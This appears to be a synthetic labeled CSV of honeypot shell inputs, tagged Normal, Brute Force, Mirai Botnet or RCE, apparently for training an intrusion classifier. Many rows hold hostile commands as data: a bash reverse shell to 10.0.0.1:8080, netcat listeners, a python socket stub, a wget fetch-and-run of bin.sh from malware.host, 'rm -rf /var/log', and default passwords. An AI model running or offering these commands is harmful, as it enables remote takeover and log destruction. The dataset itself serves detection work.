timestamp,src_ip,input,label
2026-01-08T10:46:17.306501,192.168.1.230,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.59,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.199,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.229,password,Brute Force
2026-01-08T10:46:17.308503,192.168.1.222,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.28,id,Normal
2026-01-08T10:46:17.307501,192.168.1.65,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.5,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.37,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.32,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.202,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.241,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.105,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.126,id,Normal
2026-01-08T10:46:17.307501,192.168.1.102,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.185,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.81,support,Brute Force
2026-01-08T10:46:17.309502,192.168.1.116,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.140,id,Normal
2026-01-08T10:46:17.307501,192.168.1.165,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.119,nc -lvp 4444,RCE
2026-01-08T10:46:17.309502,192.168.1.226,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.222,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.41,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.229,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.247,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.309502,192.168.1.11,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.139,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.220,id,Normal
2026-01-08T10:46:17.310501,192.168.1.21,123456,Brute Force
2026-01-08T10:46:17.311501,192.168.1.161,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.167,123456,Brute Force
2026-01-08T10:46:17.310501,192.168.1.57,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.176,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.136,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.147,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.109,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.102,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.81,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.47,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.68,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.187,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.231,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.217,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.99,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.145,password,Brute Force
2026-01-08T10:46:17.312501,192.168.1.38,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.85,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.144,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.233,nc -lvp 4444,RCE
2026-01-08T10:46:17.312501,192.168.1.234,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.310501,192.168.1.240,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.190,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.200,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.53,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.188,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.98,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.107,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.105,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.130,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.16,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.203,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.12,123456,Brute Force
2026-01-08T10:46:17.312501,192.168.1.59,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.186,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.130,support,Brute Force
2026-01-08T10:46:17.310501,192.168.1.250,password,Brute Force
2026-01-08T10:46:17.306501,192.168.1.129,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.240,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.9,id,Normal
2026-01-08T10:46:17.306501,192.168.1.24,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.171,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.160,id,Normal
2026-01-08T10:46:17.307501,192.168.1.26,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.35,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.158,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.308503,192.168.1.247,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.255,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.138,root,Brute Force
2026-01-08T10:46:17.306501,192.168.1.169,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.153,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.255,id,Normal
2026-01-08T10:46:17.312501,192.168.1.173,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.84,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.181,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.160,id,Normal
2026-01-08T10:46:17.311501,192.168.1.114,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.105,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.179,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.42,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.128,id,Normal
2026-01-08T10:46:17.312501,192.168.1.99,nc -lvp 4444,RCE
2026-01-08T10:46:17.309502,192.168.1.219,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.89,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.78,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.140,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.255,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.142,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.151,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.206,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.59,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.51,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.102,pwd,Normal
2026-01-08T10:46:17.312501,192.168.1.244,nc -lvp 4444,RCE
2026-01-08T10:46:17.306501,192.168.1.174,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.24,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.85,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.193,pwd,Normal
2026-01-08T10:46:17.309502,192.168.1.135,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.213,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.144,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.215,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.145,id,Normal
2026-01-08T10:46:17.310501,192.168.1.80,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.89,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.131,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.25,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.187,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.158,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.210,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.11,admin,Brute Force
2026-01-08T10:46:17.308503,192.168.1.118,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.61,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.130,support,Brute Force
2026-01-08T10:46:17.310501,192.168.1.67,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.239,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.191,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.309502,192.168.1.230,id,Normal
2026-01-08T10:46:17.306501,192.168.1.220,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.171,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.242,id,Normal
2026-01-08T10:46:17.308503,192.168.1.146,id,Normal
2026-01-08T10:46:17.308503,192.168.1.55,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.72,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.95,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.177,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.121,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.202,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.115,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.82,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.98,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.189,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.1,id,Normal
2026-01-08T10:46:17.306501,192.168.1.175,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.189,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.177,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.103,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.21,admin,Brute Force
2026-01-08T10:46:17.309502,192.168.1.191,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.223,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.99,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.99,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.206,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.54,password,Brute Force
2026-01-08T10:46:17.312501,192.168.1.55,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.311501,192.168.1.151,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.181,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.186,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.174,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.186,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.105,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.60,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.310501,192.168.1.4,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.42,id,Normal
2026-01-08T10:46:17.306501,192.168.1.254,id,Normal
2026-01-08T10:46:17.308503,192.168.1.34,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.226,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.123,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.240,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.174,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.244,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.205,id,Normal
2026-01-08T10:46:17.310501,192.168.1.124,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.198,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.19,123456,Brute Force
2026-01-08T10:46:17.312501,192.168.1.237,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.186,password,Brute Force
2026-01-08T10:46:17.310501,192.168.1.254,123456,Brute Force
2026-01-08T10:46:17.306501,192.168.1.32,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.67,id,Normal
2026-01-08T10:46:17.306501,192.168.1.21,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.240,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.173,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.173,id,Normal
2026-01-08T10:46:17.311501,192.168.1.184,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.173,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.199,id,Normal
2026-01-08T10:46:17.310501,192.168.1.120,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.132,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.246,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.61,id,Normal
2026-01-08T10:46:17.311501,192.168.1.236,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.38,id,Normal
2026-01-08T10:46:17.306501,192.168.1.31,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.44,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.240,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.55,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.5,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.58,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.91,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.235,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.221,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.143,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.55,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.12,nc -lvp 4444,RCE
2026-01-08T10:46:17.310501,192.168.1.195,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.68,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.10,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.54,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.229,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.234,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.179,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.186,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.214,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.221,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.7,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.227,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.85,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.240,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.190,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.42,id,Normal
2026-01-08T10:46:17.310501,192.168.1.187,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.66,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.93,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.167,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.204,support,Brute Force
2026-01-08T10:46:17.306501,192.168.1.96,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.204,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.251,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.29,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.84,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.253,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.44,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.99,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.309502,192.168.1.141,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.167,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.35,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.73,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.230,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.156,id,Normal
2026-01-08T10:46:17.309502,192.168.1.27,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.247,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.203,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.138,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.80,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.151,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.200,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.150,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.172,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.37,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.127,id,Normal
2026-01-08T10:46:17.309502,192.168.1.23,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.156,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.234,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.102,id,Normal
2026-01-08T10:46:17.307501,192.168.1.110,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.75,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.189,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.76,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.97,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.199,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.92,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.205,admin,Brute Force
2026-01-08T10:46:17.308503,192.168.1.27,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.232,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.136,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.110,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.154,nc -lvp 4444,RCE
2026-01-08T10:46:17.310501,192.168.1.67,123456,Brute Force
2026-01-08T10:46:17.307501,192.168.1.16,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.176,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.42,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.202,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.78,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.136,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.154,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.209,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.229,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.137,id,Normal
2026-01-08T10:46:17.310501,192.168.1.85,123456,Brute Force
2026-01-08T10:46:17.311501,192.168.1.116,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.180,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.123,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.186,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.12,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.160,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.172,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.113,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.236,id,Normal
2026-01-08T10:46:17.307501,192.168.1.244,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.6,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.160,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.197,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.306501,192.168.1.214,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.92,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.201,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.245,nc -lvp 4444,RCE
2026-01-08T10:46:17.307501,192.168.1.37,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.114,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.122,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.176,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.40,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.159,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.29,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.212,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.135,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.155,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.254,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.226,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.112,pwd,Normal
2026-01-08T10:46:17.309502,192.168.1.163,password,Brute Force
2026-01-08T10:46:17.308503,192.168.1.61,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.49,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.92,id,Normal
2026-01-08T10:46:17.312501,192.168.1.186,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.51,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.201,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.158,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.126,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.34,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.236,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.90,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.155,id,Normal
2026-01-08T10:46:17.310501,192.168.1.28,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.32,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.114,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.165,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.37,123456,Brute Force
2026-01-08T10:46:17.310501,192.168.1.248,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.62,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.189,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.120,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.191,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.175,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.1,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.184,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.27,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.98,nc -lvp 4444,RCE
2026-01-08T10:46:17.311501,192.168.1.177,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.90,id,Normal
2026-01-08T10:46:17.308503,192.168.1.12,id,Normal
2026-01-08T10:46:17.310501,192.168.1.79,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.249,id,Normal
2026-01-08T10:46:17.311501,192.168.1.109,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.76,id,Normal
2026-01-08T10:46:17.307501,192.168.1.28,pwd,Normal
2026-01-08T10:46:17.312501,192.168.1.23,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.251,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.185,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.103,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.101,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.138,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.119,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.71,root,Brute Force
2026-01-08T10:46:17.310501,192.168.1.118,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.52,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.176,nc -lvp 4444,RCE
2026-01-08T10:46:17.310501,192.168.1.61,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.208,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.33,root,Brute Force
2026-01-08T10:46:17.312501,192.168.1.166,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.81,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.51,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.62,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.175,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.133,id,Normal
2026-01-08T10:46:17.308503,192.168.1.191,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.109,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.239,password,Brute Force
2026-01-08T10:46:17.312501,192.168.1.34,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.174,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.173,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.213,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.156,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.309502,192.168.1.40,id,Normal
2026-01-08T10:46:17.311501,192.168.1.146,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.223,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.58,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.163,support,Brute Force
2026-01-08T10:46:17.312501,192.168.1.145,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.255,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.36,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.71,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.132,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.186,support,Brute Force
2026-01-08T10:46:17.306501,192.168.1.15,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.118,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.134,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.163,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.159,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.137,admin,Brute Force
2026-01-08T10:46:17.309502,192.168.1.30,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.194,id,Normal
2026-01-08T10:46:17.312501,192.168.1.222,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.311501,192.168.1.87,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.244,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.225,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.102,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.131,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.156,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.207,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.199,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.81,pwd,Normal
2026-01-08T10:46:17.309502,192.168.1.126,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.131,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.156,123456,Brute Force
2026-01-08T10:46:17.311501,192.168.1.133,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.245,nc -lvp 4444,RCE
2026-01-08T10:46:17.309502,192.168.1.136,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.171,/bin/busybox cat /proc/mounts,Mirai Botnet
